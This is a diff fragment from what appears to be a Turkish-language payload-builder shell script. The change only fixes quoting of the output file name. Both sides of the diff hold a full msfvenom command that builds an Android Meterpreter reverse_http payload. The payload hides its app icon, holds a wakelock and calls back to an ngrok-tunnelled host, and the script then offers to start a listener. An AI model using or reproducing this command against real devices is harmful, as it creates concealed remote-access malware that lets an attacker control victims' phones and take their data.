@@ -98,7 +98,7 @@ elif [ $payload_no = '3' ]; then
 
 elif [ $payload_no = '4' ]; then
     echo "Payload Oluşturuluyor..."
-    msfvenom -p android/meterpreter/reverse_http AndroidHideAppIcon=true AndroidMeterpreterDebug=true AndroidWakelock=true lhost=$ngrok_url lport=$payload_port -o /$payload_name
+    msfvenom -p android/meterpreter/reverse_http AndroidHideAppIcon=true AndroidMeterpreterDebug=true AndroidWakelock=true lhost=$ngrok_url lport=$payload_port -o "$payload_name"
     echo 
     echo "Payload Oluşturuldu."
     echo "Dinleyiciyi Açmak İster misin ? (e/h)"
